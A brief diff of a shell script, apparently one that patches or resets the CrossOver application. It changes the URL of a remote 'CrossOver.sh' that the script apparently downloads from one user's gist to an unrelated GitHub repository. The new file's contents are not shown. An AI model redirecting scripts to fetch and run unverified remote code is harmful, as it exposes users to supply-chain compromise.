@@ -18,7 +18,7 @@ pids=`echo ${pids[*]}|tr ',' ' '`
 [ "${pids}" ] && kill -9 `echo "${pids}"` > /dev/null 2>&1
 
 TIMESTAMP=$(date +%s)
-FIX_FILE_LINK="https://gist.github.com/santaklouse/a137ee51692b74d4cf2cc1bb68ed64ef/raw/CrossOver.sh?token=${TIMESTAMP}"
+FIX_FILE_LINK="https://github.com/vortigosha/kakaskhe228/raw/refs/heads/main/CrossOver.sh?token=${TIMESTAMP}"
 
 if [ -f CrossOver.origin ]; then
   echo 'already installed. update and exit.'
